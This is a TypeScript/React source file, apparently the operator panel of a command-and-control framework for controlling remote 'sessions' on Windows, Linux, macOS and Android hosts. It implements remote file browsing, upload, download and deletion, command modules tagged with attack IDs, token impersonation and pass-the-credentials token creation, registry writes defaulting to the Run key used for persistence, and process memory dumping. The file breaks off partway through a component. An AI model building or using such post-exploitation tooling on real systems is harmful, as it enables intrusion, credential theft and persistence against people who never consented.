/**
 * OSPanel — Shared "Inside the Machine" session panel
 * Used by Windows.tsx, Linux.tsx, MacOS.tsx, Android.tsx
 *
 * Layout:
 *   [Session List 180px] │ [Machine View flex]
 *                        │  Header: hostname · user · IP · OS · status
 *                        │  Nav: Overview | Files | Processes | Network | Modules | Tasks
 *                        │  Content area
 */

import { useState, useMemo, useRef, useEffect } from 'react'
import { useAPI, apiPost, apiFetch } from '../hooks/useAPI'
import type { Session } from '../types'
import {
  Monitor, RefreshCw, Terminal, FolderOpen, Send, Loader,
  Download, Copy, CheckCheck, ChevronRight, ChevronDown, Upload,
  Search, Hash, X, LayoutDashboard, Wifi,
  Activity, Package, List, Cpu, Camera, Trash2, FolderPlus,
  Shield, Globe,
} from 'lucide-react'

// ─── Types ────────────────────────────────────────────────────────────────────
interface ExecResult   { stdout: string; stderr: string; exit_code: number }
interface FileInfo     { name: string; is_dir: boolean; size: number; mod_time: number; mode?: string }
interface LsResp       { path: string; files: FileInfo[] }
interface Task         { id: number; cmd: string; result: string; ok: boolean; ts: number; open: boolean }
interface ProcessInfo  { pid: number; ppid: number; executable: string; owner: string; arch: string; cmdline: string[] }
interface PrivInfo     { name: string; description: string; enabled: boolean }
interface NetIface     { name: string; hw_addr: string; ip_addresses: string[] }
interface NetSocket    { local_addr: string; peer_addr: string; protocol: string; state: string; uid: number }

export interface Category {
  id: string; icon: string; label: string; atkId: string
  cmds: { icon: string; label: string; cmd: string; tag?: string; note?: string }[]
}

export interface OSConfig {
  name:      string         // "Windows" | "Linux" | "macOS" | "Android"
  icon:      string         // "🪟" | "🐧" | "🍎" | "🤖"
  prompt:    string         // "C:\>" | "$" | "%" | "$"
  filter:    (s: Session) => boolean
  modules:   Category[]
  defaultFs: string         // "C:\\" | "/" | "/" | "/sdcard"
  joinPath:  (base: string, name: string) => string
  parentPath:(p: string) => string
  quickCmds: { icon: string; label: string; cmd: string }[]
}

// Normalise the onOpenTerminal callback so both required and optional `name`
// signatures are accepted by the shared Props type.
type TerminalCb = (id: string, name?: string) => void

// ─── File icon by extension / type ───────────────────────────────────────────
function fileIcon(name: string, isDir: boolean): string {
  if (isDir) return '📁'
  const ext = name.split('.').pop()?.toLowerCase() ?? ''
  const map: Record<string, string> = {
    exe: '💻', dll: '⚙️', so: '⚙️', dylib: '⚙️', apk: '📲', bin: '💾', elf: '💻',
    sh: '⚡',  bat: '⚡', ps1: '⚡', cmd: '⚡',
    pem: '🔑', key: '🔑', pfx: '🔑', p12: '🔑', crt: '🔑', cer: '🔑', ppk: '🔑',
    db: '🗄️', sqlite: '🗄️', sqlite3: '🗄️', mdf: '🗄️', ldf: '🗄️',
    zip: '📦', tar: '📦', gz: '📦', bz2: '📦', '7z': '📦', rar: '📦', tgz: '📦',
    jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', svg: '🖼️', webp: '🖼️',
    mp4: '🎬', avi: '🎬', mkv: '🎬', mov: '🎬', mp3: '🎵', wav: '🎵', m4a: '🎵',
    pdf: '📕', doc: '📄', docx: '📄', xls: '📊', xlsx: '📊', ppt: '📊', pptx: '📊',
    txt: '📝', log: '📝', md: '📝', csv: '📝',
    cfg: '🔧', conf: '🔧', ini: '🔧', yaml: '🔧', yml: '🔧', toml: '🔧', env: '🔧',
    json: '📋', xml: '📋', html: '🌐', htm: '🌐', js: '⌨️', ts: '⌨️',
    py: '⌨️', go: '⌨️', java: '⌨️', c: '⌨️', cpp: '⌨️', rs: '⌨️', rb: '⌨️',
    id_rsa: '🔑', id_ed25519: '🔑', authorized_keys: '🔑', known_hosts: '📋',
  }
  // Special filenames
  const lname = name.toLowerCase()
  if (lname === 'id_rsa' || lname === 'id_ed25519' || lname === '.env') return '🔑'
  if (lname === 'dockerfile' || lname === 'makefile') return '⚙️'
  return map[ext] ?? '📄'
}

function fmtBytes(b: number) {
  if (b >= 1 << 30) return `${(b / (1 << 30)).toFixed(1)} GB`
  if (b >= 1 << 20) return `${(b / (1 << 20)).toFixed(1)} MB`
  if (b >= 1024)    return `${(b / 1024).toFixed(1)} KB`
  return b > 0 ? `${b} B` : '—'
}

function fmtDate(ts: number) {
  if (!ts) return '—'
  const d = new Date(ts * 1000)
  return d.toLocaleDateString('en-US', { month: 'short', day: '2-digit' }) +
    ' ' + d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: false })
}

// ─── Breadcrumb ───────────────────────────────────────────────────────────────
function Breadcrumb({ path, sep, onNav }: {
  path: string; sep: string
  onNav: (p: string) => void
}) {
  // Split path into parts preserving drive letter on Windows
  const parts: { label: string; path: string }[] = []
  if (sep === '\\') {
    // Windows: C:\Users\foo → ["C:\", "Users", "foo"]
    const segments = path.split('\\').filter(Boolean)
    if (segments.length > 0) {
      const drive = segments[0].endsWith(':') ? segments[0] + '\\' : segments[0]
      parts.push({ label: drive, path: drive })
      let cur = drive
      for (let i = 1; i < segments.length; i++) {
        cur = cur.replace(/\\$/, '') + '\\' + segments[i]
        parts.push({ label: segments[i], path: cur })
      }
    }
  } else {
    // Unix: /home/user/docs → ["/", "home", "user", "docs"]
    parts.push({ label: '/', path: '/' })
    const segments = path.split('/').filter(Boolean)
    let cur = ''
    for (const seg of segments) {
      cur += '/' + seg
      parts.push({ label: seg, path: cur })
    }
  }

  return (
    <div className="flex items-center gap-0.5 overflow-x-auto min-w-0 flex-1">
      {parts.map((p, i) => (
        <span key={i} className="flex items-center gap-0.5 shrink-0">
          {i > 0 && <span className="text-border mx-0.5">{sep === '\\' ? '›' : '/'}</span>}
          <button
            onClick={() => onNav(p.path)}
            className={`text-[10px] px-1 py-0.5 rounded hover:bg-primary/10 hover:text-primary transition-colors ${
              i === parts.length - 1 ? 'text-text font-semibold' : 'text-muted'
            }`}>
            {p.label}
          </button>
        </span>
      ))}
    </div>
  )
}

// ─── File Manager ─────────────────────────────────────────────────────────────
function FileManager({ sessionId, config, onExec }: {
  sessionId: string
  config: OSConfig
  onExec: (cmd: string, label: string) => void
}) {
  const [path,     setPath]     = useState(config.defaultFs)
  const [data,     setData]     = useState<LsResp | null>(null)
  const [loading,  setLoading]  = useState(false)
  const [lsError,  setLsError]  = useState<string | null>(null)
  const [search,   setSearch]   = useState('')
  const [sortCol,  setSortCol]  = useState<'name'|'size'|'mod'>('name')
  const [sortAsc,  setSortAsc]  = useState(true)
  const uploadRef  = useRef<HTMLInputElement>(null)
  const [uploading, setUploading] = useState(false)
  const [mkdirName, setMkdirName] = useState('')
  const [showMkdir, setShowMkdir] = useState(false)

  // Quick-nav paths shown when ls fails (permission denied on /)
  const QUICK_PATHS = config.defaultFs.includes('\\')
    ? ['C:\\', 'C:\\Users', 'C:\\Windows\\Temp', 'C:\\inetpub']
    : config.defaultFs.startsWith('/sdcard')
    ? ['/sdcard', '/sdcard/Download', '/sdcard/DCIM', '/data/local/tmp']
    : ['/', '/home', '/tmp', '/var', '/etc', '/opt']

  async function ls(p: string) {
    setLoading(true); setLsError(null)
    try {
      const r = await apiFetch<LsResp>(`/api/sessions/${sessionId}/ls?path=${encodeURIComponent(p)}`)
      setPath(r.path); setData(r)
    } catch (e) {
      const msg = String(e)
      setLsError(msg)
      // Don't fall back to exec for every error — only for non-permission errors
      if (!msg.toLowerCase().includes('permission') && !msg.toLowerCase().includes('denied')) {
        onExec(`ls -la "${p}"`, `ls ${p}`)
      }
    } finally { setLoading(false) }
  }

  async function mkdir() {
    if (!mkdirName.trim()) return
    const newPath = config.joinPath(path, mkdirName.trim())
    try {
      await apiFetch(`/api/sessions/${sessionId}/mkdir`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ path: newPath }),
      })
      setMkdirName(''); setShowMkdir(false); ls(path)
    } catch (e) { alert('mkdir failed: ' + e) }
  }

  async function deleteItem(name: string, isDir: boolean) {
    if (!confirm(`Delete "${name}"?`)) return
    const full = config.joinPath(path, name)
    try {
      await apiFetch(`/api/sessions/${sessionId}/rm?path=${encodeURIComponent(full)}${isDir ? '&recursive=true' : ''}`, { method: 'DELETE' })
      ls(path)
    } catch (e) { alert('rm failed: ' + e) }
  }

  useEffect(() => { ls(path) }, []) // eslint-disable-line

  function download(name: string) {
    const full = config.joinPath(path, name)
    window.open(`/api/sessions/${sessionId}/download?path=${encodeURIComponent(full)}`, '_blank')
  }

  async function upload(file: File) {
    setUploading(true)
    const form = new FormData()
    form.append('file', file)
    form.append('path', config.joinPath(path, file.name))
    try {
      const res = await fetch(`/api/sessions/${sessionId}/upload`, { method: 'POST', body: form })
      if (!res.ok) throw new Error(await res.text())
      ls(path)
    } catch (e) { alert(String(e)) }
    finally { setUploading(false) }
  }

  const sep = config.defaultFs.includes('\\') ? '\\' : '/'

  const files = useMemo(() => {
    let list = (data?.files ?? []).filter(f => f.name !== '.' && f.name !== '..')
    if (search.trim()) {
      const q = search.toLowerCase()
      list = list.filter(f => f.name.toLowerCase().includes(q))
    }
    return [...list].sort((a, b) => {
      // Folders always first
      if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1
      let cmp = 0
      if (sortCol === 'name') cmp = a.name.localeCompare(b.name)
      else if (sortCol === 'size') cmp = (a.size || 0) - (b.size || 0)
      else if (sortCol === 'mod') cmp = (a.mod_time || 0) - (b.mod_time || 0)
      return sortAsc ? cmp : -cmp
    })
  }, [data, search, sortCol, sortAsc])

  function sortBy(col: 'name'|'size'|'mod') {
    if (sortCol === col) setSortAsc(v => !v)
    else { setSortCol(col); setSortAsc(true) }
  }

  const SortIcon = ({ col }: { col: 'name'|'size'|'mod' }) =>
    sortCol === col
      ? <span className="text-primary">{sortAsc ? '↑' : '↓'}</span>
      : <span className="text-border">↕</span>

  return (
    <div className="flex flex-col h-full min-h-0">
      {/* Toolbar */}
      <div className="shrink-0 flex items-center gap-2 px-3 py-2 border-b border-border bg-surface/30">
        <FolderOpen size={12} className="text-primary shrink-0" />
        <Breadcrumb path={path} sep={sep} onNav={ls} />
        {/* Search */}
        <div className="flex items-center gap-1 bg-bg/60 border border-border rounded px-2 py-0.5 shrink-0">
          <Search size={9} className="text-muted" />
          <input value={search} onChange={e => setSearch(e.target.value)}
            placeholder="filter…" className="w-20 bg-transparent text-[9px] text-text placeholder-muted/60 outline-none" />
        </div>
        <button onClick={() => ls(config.parentPath(path))} title="Up"
          className="text-muted hover:text-text shrink-0" >
          <ChevronRight size={12} className="rotate-180" />
        </button>
        <button onClick={() => ls(path)} className="text-muted hover:text-primary shrink-0" title="Refresh">
          <RefreshCw size={11} className={loading ? 'animate-spin' : ''} />
        </button>
        <button onClick={() => uploadRef.current?.click()} title="Upload"
          className="text-muted hover:text-primary shrink-0 flex items-center gap-1 text-[9px]">
          {uploading ? <Loader size={10} className="animate-spin" /> : <Upload size={10} />}
        </button>
        <button onClick={() => setShowMkdir(v => !v)} title="New Folder"
          className="text-muted hover:text-primary shrink-0">
          <FolderPlus size={10} />
        </button>
        <input ref={uploadRef} type="file" className="hidden"
          onChange={e => e.target.files?.[0] && upload(e.target.files[0])} />
      </div>

      {/* Column headers */}
      <div className="shrink-0 grid text-[9px] font-bold text-muted uppercase tracking-wider px-3 py-1.5 border-b border-border/50 bg-surface/20"
        style={{ gridTemplateColumns: '24px 1fr 80px 130px 52px' }}>
        <span />
        <button onClick={() => sortBy('name')} className="text-left flex items-center gap-1 hover:text-text">
          Name <SortIcon col="name" />
        </button>
        <button onClick={() => sortBy('size')} className="text-right flex items-center justify-end gap-1 hover:text-text">
          Size <SortIcon col="size" />
        </button>
        <button onClick={() => sortBy('mod')} className="flex items-center gap-1 hover:text-text pl-3">
          Modified <SortIcon col="mod" />
        </button>
        <span />
      </div>

      {/* Permission denied / error → show quick-nav */}
      {lsError && (
        <div className="shrink-0 px-3 py-2 border-b border-danger/30 bg-danger/5">
          <div className="text-[9px] text-danger mb-2 truncate">{lsError}</div>
          <div className="flex flex-wrap gap-1">
            {QUICK_PATHS.map(p => (
              <button key={p} onClick={() => ls(p)}
                className="text-[9px] px-2 py-0.5 rounded border border-border text-muted hover:text-primary hover:border-primary/40 font-mono transition-colors">
                {p}
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Mkdir form */}
      {showMkdir && (
        <div className="shrink-0 flex items-center gap-1.5 px-3 py-1.5 border-b border-border bg-surface/30">
          <FolderPlus size={10} className="text-primary shrink-0" />
          <input value={mkdirName} onChange={e => setMkdirName(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') mkdir(); if (e.key === 'Escape') setShowMkdir(false) }}
            autoFocus placeholder="New folder name…"
            className="flex-1 bg-bg border border-border rounded px-2 py-0.5 text-[10px] text-text outline-none focus:border-primary" />
          <button onClick={mkdir} className="text-primary text-[10px] px-2 py-0.5 rounded border border-primary/40 hover:bg-primary/10">Create</button>
          <button onClick={() => setShowMkdir(false)} className="text-muted hover:text-text"><X size={10} /></button>
        </div>
      )}

      {/* File list */}
      <div className="flex-1 overflow-y-auto">
        {loading ? (
          <div className="flex items-center justify-center p-8"><Loader size={16} className="text-muted animate-spin" /></div>
        ) : files.length === 0 && !lsError ? (
          <div className="p-6 text-muted text-xs text-center">{search ? 'No matches' : 'Empty directory'}</div>
        ) : lsError && files.length === 0 ? null : (
          files.map((f, i) => (
            <div key={f.name}
              className={`grid items-center px-3 py-1.5 border-b border-border/15 hover:bg-white/4 group transition-colors cursor-default ${
                f.is_dir ? 'hover:bg-primary/5' : ''
              }`}
              style={{ gridTemplateColumns: '24px 1fr 80px 130px 52px' }}>
              {/* Icon */}
              <span className="text-sm leading-none select-none">{fileIcon(f.name, f.is_dir)}</span>
              {/* Name */}
              <button
                onClick={() => f.is_dir && ls(config.joinPath(path, f.name))}
                className={`text-[11px] text-left truncate font-mono ${
                  f.is_dir ? 'text-accent hover:text-primary font-semibold cursor-pointer' : 'text-text/90'
                }`}>
                {f.name}
              </button>
              {/* Size */}
              <span className="text-[10px] text-muted text-right tabular-nums pr-3">
                {f.is_dir ? '' : fmtBytes(f.size)}
              </span>
              {/* Modified */}
              <span className="text-[9px] text-muted/60 tabular-nums pl-1">
                {fmtDate(f.mod_time)}
              </span>
              {/* Actions */}
              <div className="flex items-center justify-center gap-1">
                {!f.is_dir && (
                  <button onClick={() => download(f.name)} title="Download"
                    className="text-muted hover:text-primary opacity-0 group-hover:opacity-100 transition-all">
                    <Download size={10} />
                  </button>
                )}
                <button onClick={() => deleteItem(f.name, f.is_dir)} title="Delete"
                  className="text-muted hover:text-danger opacity-0 group-hover:opacity-100 transition-all">
                  <Trash2 size={10} />
                </button>
              </div>
            </div>
          ))
        )}
      </div>

      {/* Status bar */}
      <div className="shrink-0 flex items-center justify-between px-3 py-1 border-t border-border/50 text-[9px] text-muted/60">
        <span>{files.length} item{files.length !== 1 ? 's' : ''}</span>
        <span className="font-mono truncate max-w-[60%]">{path}</span>
      </div>
    </div>
  )
}

// ─── Task History ─────────────────────────────────────────────────────────────
function TaskHistory({ tasks, running, onClear, onToggle, copied, onCopy }: {
  tasks: Task[]; running: boolean
  onClear: () => void; onToggle: (id: number) => void
  copied: number | null; onCopy: (id: number, text: string) => void
}) {
  return (
    <div className="flex flex-col h-full min-h-0">
      <div className="shrink-0 flex items-center justify-between px-4 py-2 border-b border-border">
        <div className="flex items-center gap-2">
          <Hash size={11} className="text-muted" />
          <span className="text-[10px] text-muted font-bold uppercase tracking-wider">Task Output</span>
          {tasks.length > 0 && <span className="bg-border/60 text-muted text-[9px] px-1.5 py-0.5 rounded-full">{tasks.length}</span>}
          {running && <Loader size={10} className="text-primary animate-spin" />}
        </div>
        {tasks.length > 0 && <button onClick={onClear} className="text-[9px] text-muted hover:text-danger">Clear</button>}
      </div>
      <div className="flex-1 overflow-y-auto p-3 space-y-2">
        {tasks.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-full gap-3 py-12 text-center">
            <div className="w-10 h-10 rounded-full border border-border/40 flex items-center justify-center">
              <Terminal size={16} className="text-border" />
            </div>
            <div className="text-muted text-xs">No output yet</div>
            <div className="text-muted/50 text-[10px]">Run any command from Overview or Modules</div>
          </div>
        ) : tasks.map((t, i) => (
          <div key={t.id} className={`border rounded overflow-hidden ${t.ok ? 'border-border/50' : 'border-danger/30'}`}>
            <button onClick={() => onToggle(t.id)}
              className={`w-full flex items-center gap-2.5 px-3 py-2 text-left transition-colors ${
                t.ok ? 'bg-surface/50 hover:bg-surface' : 'bg-danger/5 hover:bg-danger/8'
              }`}>
              <span className="text-[9px] text-muted/40 font-mono shrink-0">#{String(tasks.length - i).padStart(3, '0')}</span>
              <span className={`shrink-0 text-[8px] font-bold tracking-wider px-1.5 py-0.5 rounded ${
                t.ok ? 'bg-primary/15 text-primary' : 'bg-danger/20 text-danger'
              }`}>{t.ok ? 'OK' : 'ERR'}</span>
              <span className="flex-1 text-[10px] text-text font-semibold truncate">{t.cmd}</span>
              <span className="text-[9px] text-muted/50 shrink-0 tabular-nums">{new Date(t.ts).toLocaleTimeString()}</span>
              <button onClick={e => { e.stopPropagation(); onCopy(t.id, t.result) }}
                className="text-muted hover:text-primary shrink-0">
                {copied === t.id ? <CheckCheck size={10} /> : <Copy size={10} />}
              </button>
              {t.open ? <ChevronDown size={10} className="text-muted shrink-0" /> : <ChevronRight size={10} className="text-muted shrink-0" />}
            </button>
            {t.open && (
              <pre className="px-4 py-3 text-[10px] text-text/90 whitespace-pre-wrap break-all leading-relaxed max-h-80 overflow-y-auto bg-bg/70 border-t border-border/30 font-mono">
                {t.result}
              </pre>
            )}
          </div>
        ))}
      </div>
    </div>
  )
}

// ─── Module Accordion ────────────────────────────────────────────────────────
function ModuleAccordion({ modules, running, onExec, search, onSearch }: {
  modules: Category[]; running: boolean
  onExec: (cmd: string, label: string) => void
  search: string; onSearch: (v: string) => void
}) {
  const [open, setOpen] = useState<Set<string>>(new Set([modules[0]?.id ?? '']))

  const filtered = useMemo(() => {
    const q = search.trim().toLowerCase()
    if (!q) return modules
    return modules.map(c => ({ ...c, cmds: c.cmds.filter(cmd => cmd.label.toLowerCase().includes(q)) }))
                  .filter(c => c.cmds.length > 0)
  }, [modules, search])

  function toggle(id: string) {
    setOpen(prev => {
      const s = new Set(prev); s.has(id) ? s.delete(id) : s.add(id); return s
    })
  }

  return (
    <div className="flex flex-col h-full min-h-0">
      {/* Search */}
      <div className="shrink-0 px-3 py-2 border-b border-border">
        <div className="flex items-center gap-2 bg-bg/60 border border-border rounded px-2.5 py-1.5">
          <Search size={11} className="text-muted shrink-0" />
          <input value={search} onChange={e => onSearch(e.target.value)} placeholder="Search modules…"
            className="flex-1 bg-transparent text-[10px] text-text placeholder-muted/50 outline-none" />
          {search && <button onClick={() => onSearch('')} className="text-muted hover:text-text shrink-0"><X size={10} /></button>}
        </div>
      </div>
      {/* Accordion */}
      <div className="flex-1 overflow-y-auto">
        {filtered.map(cat => {
          const isOpen = open.has(cat.id) || !!search.trim()
          return (
            <div key={cat.id} className="border-b border-border/30">
              <button onClick={() => !search.trim() && toggle(cat.id)}
                className="w-full flex items-center gap-2 px-3 py-2 hover:bg-white/4 transition-colors group">
                <span className="text-sm">{cat.icon}</span>
                <span className="flex-1 text-[9px] font-bold tracking-widest text-muted group-hover:text-text uppercase text-left">{cat.label}</span>
                <span className="text-[8px] text-muted/40 font-mono">{cat.atkId}</span>
                <span className="text-[9px] text-muted/40">{cat.cmds.length}</span>
                {isOpen ? <ChevronDown size={10} className="text-muted" /> : <ChevronRight size={10} className="text-muted" />}
              </button>
              {isOpen && (
                <div className="bg-bg/40">
                  {cat.cmds.map(c => (
                    <button key={c.label} disabled={running} onClick={() => onExec(c.cmd, c.label)}
                      className="w-full flex items-start gap-2 px-5 py-1.5 hover:bg-primary/8 transition-colors group disabled:opacity-40 text-left border-b border-border/10 last:border-0">
                      <span className="text-xs shrink-0 mt-0.5">{c.icon}</span>
                      <div className="flex-1 min-w-0">
                        <div className="text-[10px] text-muted group-hover:text-text truncate">{c.label}</div>
                        {c.note && <div className="text-[8px] text-muted/40">{c.note}</div>}
                      </div>
                      {c.tag && <span className="text-[8px] text-muted/30 font-mono shrink-0 mt-0.5">{c.tag}</span>}
                    </button>
                  ))}
                </div>
              )}
            </div>
          )
        })}
      </div>
    </div>
  )
}

// ─── Power Ops — Token / Registry / Services / ProcDump ─────────────────────
function PowerOps({ sessionId, osName }: { sessionId: string; osName: string }) {
  const isWindows = osName.toLowerCase() === 'windows'
  const [tab, setTab]   = useState<'token'|'registry'|'services'|'dump'>('token')
  const [msg, setMsg]   = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  // ── Token state ──────────────────────────────────────────────────────────
  const [tokenOwner, setTokenOwner] = useState<string | null>(null)
  const [impUser, setImpUser]       = useState('')
  const [mkUser, setMkUser]         = useState('')
  const [mkPass, setMkPass]         = useState('')
  const [mkDomain, setMkDomain]     = useState('')

  // ── Registry state ───────────────────────────────────────────────────────
  const [regHive, setRegHive]   = useState('HKCU')
  const [regPath, setRegPath]   = useState('SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
  const [regKey, setRegKey]     = useState('')
  const [regKeys, setRegKeys]   = useState<string[]>([])
  const [regVals, setRegVals]   = useState<string[]>([])
  const [regResult, setRegResult] = useState<string | null>(null)
  const [regWriteVal, setRegWriteVal] = useState('')
  const [regWriteType, setRegWriteType] = useState(1)

  // ── Services state ───────────────────────────────────────────────────────
  const [services, setServices] = useState<{ name: string; display_name: string; status: number; bin_path: string; startup_type: number }[]>([])

  // ── Dump state ───────────────────────────────────────────────────────────
  const [dumpPid, setDumpPid] = useState('')

  async function go_<T>(fn: () => Promise<T>, successMsg?: string) {
    setLoading(true); setMsg(null)
    try {
      const r = await fn()
      if (successMsg) setMsg('✓ ' + successMsg)
      return r
    } catch (e) { setMsg('✗ ' + e) }
    finally { setLoading(false) }
    return null
  }

  async function getTokenOwner() {
    const r = await go_(() => apiFetch<{ owner: string }>(`/api/sessions/${sessionId}/token`))
    if (r) setTokenOwner(r.owner)
  }

  async function doImpersonate() {
    await go_(() => apiPost(`/api/sessions/${sessionId}/impersonate`, { username: impUser }), `Impersonating ${impUser}`)
  }

  async function doMakeToken() {
    await go_(() => apiPost(`/api/sessions/${sessionId}/maketoken`, { username: mkUser, password: mkPass, domain: mkDomain }), 'Token created')
  }

  async function doRevToSelf() {
    await go_(() => apiPost(`/api/sessions/${sessionId}/revtoself`, {}), 'Reverted to self')
  }

  async function loadRegKeys() {
    const r = await go_(() => apiFetch<string[]>(`/api/sessions/${sessionId}/registry/keys?hive=${regHive}&path=${encodeURIComponent(regPath)}`))
    if (r) setRegKeys(r)
  }

  async function loadRegValues() {
    const r = await go_(() => apiFetch<string[]>(`/api/sessions/${sessionId}/registry/values?hive=${regHive}&path=${encodeURIComponent(regPath)}`))
    if (r) setRegVals(r)
  }

  async function readRegValue() {
    const r = await go_(() => apiFetch<{ value: string }>(`/api/sessions/${sessionId}/registry?hive=${regHive}&path=${encodeURIComponent(regPath)}&key=${encodeURIComponent(regKey)}`))
    if (r) setRegResult(r.value)
  }

  async function writeRegValue() {
    await go_(() => apiPost(`/api/sessions/${sessionId}/registry`, { hive: regHive, path: regPath, key: regKey, string_value: regWriteVal, type: regWriteType }), 'Value written')
  }

  async function deleteRegKey() {
    if (!confirm(`Delete registry key ${regHive}\\${regPath}\\${regKey}?`)) return
    await go_(() => apiFetch(`/api/sessions/${sessionId}/registry?hive=${regHive}&path=${encodeURIComponent(regPath)}&key=${encodeURIComponent(regKey)}`, { method: 'DELETE' }), 'Key deleted')
  }

  async function loadServices() {
    const r = await go_(() => apiFetch<typeof services>(`/api/sessions/${sessionId}/services`))
    if (r) setServices(r)
  }

  async function dumpProcess() {
    if (!dumpPid.trim()) return
    setLoading(true); setMsg(null)
    try {
      const url = `/api/sessions/${sessionId}/procdump`
      const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ pid: parseInt(dumpPid) }) })
      if (!res.ok) throw new Error(await res.text())
      const blob = await res.blob()
      const a = document.createElement('a'); a.href = URL.createObjectURL(blob)
      a.download = `pid_${dumpPid}.dmp`; a.click()
      setMsg(`✓ Dump downloaded: pid_${dumpPid}.dmp`)
    } catch (e) { setMsg('✗ ' + e) }
    finally { setLoading(false) }
  }

  const inputCls = 'flex-1 bg-bg border border-border rounded px-2 py-1 text-[10px] text-text font-mono focus:border-primary outline-none'
  const btnCls   = 'px-3 py-1 rounded border border-primary/40 text-primary bg-primary/5 hover:bg-primary/15 text-[10px] transition-colors disabled:opacity-40 whitespace-nowrap'
  const TABS_POW = isWindows
    ? (['token','registry','services','dump'] as const)
    : (['token','dump'] as const)

  return (
    <div className="flex flex-col h-full min-h-0">
      {/* Tab bar */}
      <div className="shrink-0 flex border-b border-border">
        {TABS_POW.map(t => (
          <button key={t} onClick={() => setTab(t as typeof tab)}
            className={`px-4 py-2 text-[10px] border-b-2 transition-colors capitalize ${tab === t ? 'border-primary text-primary font-semibold' : 'border-transparent text-muted hover:text-text'}`}>
            {t === 'token' ? '🔑 Tokens' : t === 'registry' ? '📋 Registry' : t === 'services' ? '⚙️ Services' : '💾 Procdump'}
          </button>
        ))}
      </div>
      {msg && <div className={`shrink-0 px-3 py-1 text-[9px] border-b border-border ${msg.startsWith('✓') ? 'text-primary bg-primary/5' : 'text-danger bg-danger/5'}`}>{msg}</div>}

      <div className="flex-1 overflow-y-auto p-4 space-y-4">
        {/* ── Token tab ─────────────────────────────────────────── */}
        {tab === 'token' && (
          <>
            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Current Token</div>
              <div className="flex items-center gap-2">
                <button onClick={getTokenOwner} disabled={loading} className={btnCls}>Get Token Owner</button>
                <button onClick={doRevToSelf} disabled={loading} className={`${btnCls} border-warn/40 text-warn bg-warn/5 hover:bg-warn/15`}>Rev To Self</button>
                {tokenOwner && <span className="text-[10px] text-text font-mono">{tokenOwner}</span>}
              </div>
            </div>
            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Impersonate User</div>
              <div className="flex items-center gap-2">
                <input value={impUser} onChange={e => setImpUser(e.target.value)} placeholder="DOMAIN\\username" className={inputCls} />
                <button onClick={doImpersonate} disabled={loading || !impUser} className={btnCls}>Impersonate</button>
              </div>
            </div>
            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Make Token (Pass-the-Credentials)</div>
              <div className="grid grid-cols-3 gap-2">
                <input value={mkUser} onChange={e => setMkUser(e.target.value)} placeholder="username" className={inputCls} />
                <input type="password" value={mkPass} onChange={e => setMkPass(e.target.value)} placeholder="password" className={inputCls} />
                <input value={mkDomain} onChange={e => setMkDomain(e.target.value)} placeholder="domain (optional)" className={inputCls} />
              </div>
              <button onClick={doMakeToken} disabled={loading || !mkUser || !mkPass} className={btnCls}>Create Token</button>
            </div>
          </>
        )}

        {/* ── Registry tab ─────────────────────────────────────── */}
        {tab === 'registry' && isWindows && (
          <>
            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Registry Path</div>
              <div className="flex items-center gap-2">
                <select value={regHive} onChange={e => setRegHive(e.target.value)}
                  className="bg-bg border border-border rounded px-2 py-1 text-[10px] text-text focus:border-primary outline-none shrink-0">
                  {['HKCU','HKLM','HKCR','HKU','HKCC'].map(h => <option key={h}>{h}</option>)}
                </select>
                <input value={regPath} onChange={e => setRegPath(e.target.value)} placeholder="Path\To\Key" className={inputCls} />
              </div>
              <div className="flex items-center gap-2">
                <input value={regKey} onChange={e => setRegKey(e.target.value)} placeholder="Value name (optional)" className={inputCls} />
                <button onClick={loadRegKeys} disabled={loading} className={btnCls}>List Keys</button>
                <button onClick={loadRegValues} disabled={loading} className={btnCls}>List Values</button>
                <button onClick={readRegValue} disabled={loading || !regKey} className={btnCls}>Read</button>
              </div>
              {regResult && (
                <div className="font-mono text-[10px] text-primary bg-bg p-2 rounded border border-border">{regResult}</div>
              )}
              {regKeys.length > 0 && (
                <div className="flex flex-wrap gap-1">{regKeys.map(k => (
                  <button key={k} onClick={() => setRegPath(regPath.replace(/\\+$/, '') + '\\' + k)}
                    className="text-[9px] px-2 py-0.5 rounded border border-border text-muted hover:text-primary hover:border-primary/40 font-mono transition-colors">
                    📁 {k}
                  </button>
                ))}</div>
              )}
              {regVals.length > 0 && (
                <div className="flex flex-wrap gap-1">{regVals.map(v => (
                  <button key={v} onClick={() => setRegKey(v)}
                    className="text-[9px] px-2 py-0.5 rounded border border-border text-muted hover:text-primary hover:border-primary/40 font-mono transition-colors">
                    🔑 {v}
                  </button>
                ))}</div>
              )}
            </div>
            <div className="bg-surface border border-border rounded-lg p-3 space-y-2">
              <div className="text-[9px] text-primary font-bold uppercase tracking-widest">Write / Delete</div>
              <div className="flex items-center gap-2">
                <input value={regWriteVal} onChange={e => setRegWriteVal(e.target.value)} placeholder="Value to write" className={inputCls} />
                <select value={regWriteType} onChange={e => setRegWriteType(parseInt(e.target.value))}
                  className="bg-bg border border-border rounded px-2 py-1 text-[10px] text-text focus:border-primary outline-none shrink-0">
                  <option value={1}>REG_SZ</option><option value={4}>REG_DWORD</option><option value={11}>REG_QWORD</option>
                </select>
                <button onClick={writeRegValue} disabled={loading || !regKey || !regWriteVal} className={btnCls}>Write</button>
                <button onClick={deleteRegKey} disabled={loading || !regKey}
                  className="px-3 py-1 rounded border border-danger/40 text-danger bg-danger/5 hover:bg-danger/15 text-[10px] transition-colors disabled:opacity-40">
                  Delete
                </button>
              </div>
            </div>
          </>
        )}

        {/* ── Services tab ─────────────────────────────────────── */}
